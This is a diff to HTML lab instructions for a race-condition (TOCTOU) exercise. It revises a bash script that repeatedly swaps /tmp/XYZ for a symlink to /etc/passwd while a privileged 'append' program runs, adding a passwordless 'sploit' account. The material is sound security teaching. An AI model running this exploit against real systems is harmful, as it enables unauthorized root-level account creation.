@@ -500,7 +500,8 @@ prompted for a password, and we can log into the user’s account.</p>
 <p>So our attack should write an entry like the <code>sploit</code> user
 entry above, but instead of “<code>x</code>”, we can use the magic value
 given above, and we will be able to log in to the <code>sploit</code>
-account without a password.</p>
+account without a password – for instance, by running
+<code>su sploit</code>.</p>
 <!--
 
 ```
@@ -526,22 +527,44 @@ the vulnerable program for many times; we only need to achieve success
 once among all these trials. Since you need to run the attacks and the
 vulnerable program for many times, you need to write a program to
 automate the attack process. To avoid manually typing an input to the
-vulnerable program vulp, you can use input redirection.</p>
+vulnerable program <code>append</code>, you can use input
+redirection.</p>
 <p>Try saving the following file as <code>launch.sh</code>, and give it
 executable permissions:</p>
 <div class="sourceCode" id="cb15"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/env bash</span></span>
 <span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a><span class="va">LIMIT</span><span class="op">=</span>10</span>
-<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> <span class="kw">((</span><span class="va">i</span><span class="op">=</span><span class="dv">0</span><span class="kw">;</span> <span class="va">i</span> <span class="op">&lt;</span> <span class="va">LIMIT</span><span class="kw">;</span> <span class="va">i</span><span class="op">=</span><span class="va">i</span><span class="op">+</span><span class="dv">1</span><span class="kw">));</span> <span class="cf">do</span></span>
-<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a>  <span class="fu">rm</span> <span class="at">-rf</span> /tmp/XYZ</span>
-<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a>  <span class="fu">touch</span> /tmp/XYZ</span>
-<span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a>  <span class="co"># replace AAA with the text you want appended to /etc/passwd</span></span>
-<span id="cb15-9"><a href="#cb15-9" aria-hidden="true" tabindex="-1"></a>  <span class="kw">(</span><span class="bu">echo</span> AAA <span class="kw">|</span> <span class="fu">nice</span> 19 ./append<span class="kw">)</span> <span class="kw">&amp;</span></span>
-<span id="cb15-10"><a href="#cb15-10" aria-hidden="true" tabindex="-1"></a>  <span class="fu">unlink</span> /tmp/XYZ</span>
-<span id="cb15-11"><a href="#cb15-11" aria-hidden="true" tabindex="-1"></a>  <span class="fu">ln</span> <span class="at">-s</span> /etc/passwd /tmp/XYZ </span>
-<span id="cb15-12"><a href="#cb15-12" aria-hidden="true" tabindex="-1"></a>  <span class="fu">tail</span> <span class="at">-n</span> 1 /etc/passwd</span>
-<span id="cb15-13"><a href="#cb15-13" aria-hidden="true" tabindex="-1"></a><span class="cf">done</span></span></code></pre></div>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a><span class="co"># You can adjust LIMIT to change</span></span>
+<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a><span class="co"># the number of times the loop runs.</span></span>
+<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a><span class="va">LIMIT</span><span class="op">=</span>1</span>
+<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a><span class="co"># uncommenting the following line will print</span></span>
+<span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a><span class="co"># each command as it executes:</span></span>
+<span id="cb15-9"><a href="#cb15-9" aria-hidden="true" tabindex="-1"></a><span class="co">#set -x</span></span>
+<span id="cb15-10"><a href="#cb15-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-11"><a href="#cb15-11" aria-hidden="true" tabindex="-1"></a><span class="va">orig_file</span><span class="op">=</span>/tmp/XYZ</span>
+<span id="cb15-12"><a href="#cb15-12" aria-hidden="true" tabindex="-1"></a><span class="va">target_file</span><span class="op">=</span>/etc/passwd</span>
+<span id="cb15-13"><a href="#cb15-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-14"><a href="#cb15-14" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> <span class="kw">((</span><span class="va">i</span><span class="op">=</span><span class="dv">0</span><span class="kw">;</span> <span class="va">i</span> <span class="op">&lt;</span> <span class="va">LIMIT</span><span class="kw">;</span> <span class="va">i</span><span class="op">=</span><span class="va">i</span><span class="op">+</span><span class="dv">1</span><span class="kw">));</span> <span class="cf">do</span></span>
+<span id="cb15-15"><a href="#cb15-15" aria-hidden="true" tabindex="-1"></a>  <span class="fu">rm</span> <span class="at">-rf</span> <span class="va">$orig_file</span></span>
+<span id="cb15-16"><a href="#cb15-16" aria-hidden="true" tabindex="-1"></a>  <span class="fu">touch</span> <span class="va">$orig_file</span></span>
+<span id="cb15-17"><a href="#cb15-17" aria-hidden="true" tabindex="-1"></a>  <span class="co"># replace AAA with the text you want appended to /etc/passwd</span></span>
+<span id="cb15-18"><a href="#cb15-18" aria-hidden="true" tabindex="-1"></a>  <span class="kw">(</span><span class="bu">echo</span> <span class="st">&#39;AAA&#39;</span> <span class="kw">|</span> <span class="fu">nice</span> <span class="at">-n</span> 19 ./append<span class="kw">)</span> <span class="kw">&amp;</span></span>
+<span id="cb15-19"><a href="#cb15-19" aria-hidden="true" tabindex="-1"></a>  <span class="fu">unlink</span> <span class="va">$orig_file</span></span>
+<span id="cb15-20"><a href="#cb15-20" aria-hidden="true" tabindex="-1"></a>  <span class="fu">ln</span> <span class="at">-s</span> <span class="va">$target_file</span> <span class="va">$orig_file</span></span>
+<span id="cb15-21"><a href="#cb15-21" aria-hidden="true" tabindex="-1"></a>  <span class="co"># replace BBB with some string that will be found</span></span>
+<span id="cb15-22"><a href="#cb15-22" aria-hidden="true" tabindex="-1"></a>  <span class="co"># if your attack is successful.</span></span>
+<span id="cb15-23"><a href="#cb15-23" aria-hidden="true" tabindex="-1"></a>  <span class="co"># if you insert a `sleep()` in the append</span></span>
+<span id="cb15-24"><a href="#cb15-24" aria-hidden="true" tabindex="-1"></a>  <span class="co"># program, you&#39;ll also want to add a sleep command</span></span>
+<span id="cb15-25"><a href="#cb15-25" aria-hidden="true" tabindex="-1"></a>  <span class="co"># (see `man 1 sleep`)</span></span>
+<span id="cb15-26"><a href="#cb15-26" aria-hidden="true" tabindex="-1"></a>  <span class="co"># here, so your check waits til append has completed.</span></span>
+<span id="cb15-27"><a href="#cb15-27" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="fu">grep</span> <span class="st">&#39;BBB&#39;</span> <span class="va">$target_file</span> <span class="op">&gt;</span> /dev/null<span class="kw">;</span> <span class="cf">then</span></span>
+<span id="cb15-28"><a href="#cb15-28" aria-hidden="true" tabindex="-1"></a>    <span class="bu">echo</span> <span class="st">&quot;attack succeeded&quot;</span></span>
+<span id="cb15-29"><a href="#cb15-29" aria-hidden="true" tabindex="-1"></a>    <span class="bu">exit</span> 0</span>
+<span id="cb15-30"><a href="#cb15-30" aria-hidden="true" tabindex="-1"></a>  <span class="cf">fi</span></span>
+<span id="cb15-31"><a href="#cb15-31" aria-hidden="true" tabindex="-1"></a><span class="cf">done</span></span>
+<span id="cb15-32"><a href="#cb15-32" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-33"><a href="#cb15-33" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&quot;attack failed&quot;</span></span>
+<span id="cb15-34"><a href="#cb15-34" aria-hidden="true" tabindex="-1"></a><span class="bu">exit</span> 1</span></code></pre></div>
 <p>If you give this program a higher <code>LIMIT</code> and run it, you
 likely will still not see success – so we need to make our attack
 <em>faster</em>, and <code>./append</code> slower. What ways are there
@@ -550,10 +573,13 @@ of doing so?</p>
 insert the following line (which calls the <code>sleep()</code>
 function, see <code>man 3 sleep</code>) –</p>
 <pre><code>  sleep(1);</code></pre>
-<p>into <code>append.c</code>, before the call to <code>open()</code>.
-But a successful exploit of this vulnerability should be able to (when
-run sufficiently many times) take advantage of the original program,
-even without the call to <code>sleep()</code>.</p>
+<p>into <code>append.c</code>, before the call to <code>open()</code>,
+then recompile <code>append</code> and run the <code>bash</code> script
+against it.</p>
+<p>But a successful exploit of this vulnerability should be able to
+(when run sufficiently many times) take advantage of the original
+<code>append</code> program, even without the call to
+<code>sleep()</code>.</p>
 <p>Hint: a C program will be much faster than the Bash script above, and
 the following C functions can be used to unlink (delete) a file and
 create a symlink:</p>
